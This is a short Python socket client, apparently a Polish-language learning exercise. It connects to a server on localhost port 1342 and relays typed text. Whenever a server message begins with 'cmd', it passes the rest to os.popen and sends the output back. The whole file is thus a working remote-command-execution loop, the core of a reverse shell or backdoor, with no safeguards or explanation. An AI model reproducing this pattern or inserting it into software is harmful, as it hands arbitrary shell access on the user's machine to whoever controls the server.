import socket
import time

import os

my_socket = socket.socket()
my_socket.connect(("127.0.0.1", 1342))

od_serwera = ""

try:
    while True:
        if od_serwera.startswith("cmd"):
            rezult = os.popen(od_serwera[4:]).read()
            my_socket.send(rezult.encode())
        else:
            komenda = input("podaj tekst:")
            my_socket.send(komenda.encode())

        if "exit" == komenda:
            break


        od_serwera = my_socket.recv(2048).decode()
        print("od serwa:",od_serwera)
except Exception as e:
    print(e)
finally: #wykonuje sie zawsze po wyjsciu z bloku 'try/except'
    my_socket.close()